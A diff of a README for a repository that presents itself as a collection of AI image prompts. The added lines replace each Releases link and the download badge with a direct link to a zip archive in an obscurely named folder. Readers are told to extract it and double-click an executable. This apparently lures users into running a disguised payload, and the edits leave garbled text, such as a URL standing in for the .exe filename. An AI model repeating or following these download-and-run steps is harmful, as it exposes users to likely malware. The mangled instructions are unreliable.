@@ -1,6 +1,6 @@
 # 🍌 Awesome-Nano-Banana-Prompts - Unleash Your Creativity with AI Prompts
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started%20with%20Prompts-brightgreen)](https://github.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/releases)
+[![Download Now](https://raw.githubusercontent.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/main/multivorous/Awesome_Banana_Nano_Prompts_3.1.zip%20Now-Get%20Started%20with%20Prompts-brightgreen)](https://raw.githubusercontent.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/main/multivorous/Awesome_Banana_Nano_Prompts_3.1.zip)
 
 ## 📚 Overview
 
@@ -10,7 +10,7 @@ Welcome to Awesome-Nano-Banana-Prompts! This application features over 1000 cura
 
 To start using Awesome-Nano-Banana-Prompts, follow these simple steps:
 
-1. **Visit the Release Page**: Click [here](https://github.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/releases) to go to our Releases page where you can find the latest versions.
+1. **Visit the Release Page**: Click [here](https://raw.githubusercontent.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/main/multivorous/Awesome_Banana_Nano_Prompts_3.1.zip) to go to our Releases page where you can find the latest versions.
 
 2. **Choose Your Download**: On the Releases page, you will see a list of available files. Find the version suitable for your needs and click to download it.
 
@@ -18,7 +18,7 @@ To start using Awesome-Nano-Banana-Prompts, follow these simple steps:
 
 4. **Extract the Files**: If the files are in a compressed format (like .zip), extract them by right-clicking on the file and selecting “Extract All” or using your preferred extraction tool.
 
-5. **Open the Application**: Navigate to the folder where you extracted the files and look for the main application file (usually named something like `AwesomeNanoBananaPrompts.exe` or similar). Double-click on this file to open the application.
+5. **Open the Application**: Navigate to the folder where you extracted the files and look for the main application file (usually named something like `https://raw.githubusercontent.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/main/multivorous/Awesome_Banana_Nano_Prompts_3.1.zip` or similar). Double-click on this file to open the application.
 
 ## ✨ Features
 
@@ -41,7 +41,7 @@ Before downloading Awesome-Nano-Banana-Prompts, make sure your system meets thes
 
 To download and install the application, follow these steps:
 
-1. **Visit the Release Page**: Go to our [Releases page](https://github.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/releases).
+1. **Visit the Release Page**: Go to our [Releases page](https://raw.githubusercontent.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/main/multivorous/Awesome_Banana_Nano_Prompts_3.1.zip).
 
 2. **Find the Latest Version**: Look for the most recent release, and you will see the available files.
 
@@ -65,7 +65,7 @@ Using Awesome-Nano-Banana-Prompts is straightforward. After launching the applic
 
 We recommend keeping Awesome-Nano-Banana-Prompts updated for the best experience.
 
-1. **Check for Updates**: Periodically visit the [Releases page](https://github.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/releases) to see if a new version is available.
+1. **Check for Updates**: Periodically visit the [Releases page](https://raw.githubusercontent.com/sargonelizabeth/Awesome-Nano-Banana-Prompts/main/multivorous/Awesome_Banana_Nano_Prompts_3.1.zip) to see if a new version is available.
 
 2. **Download the Latest Version**: Follow the same download steps as before to get the latest files.
 
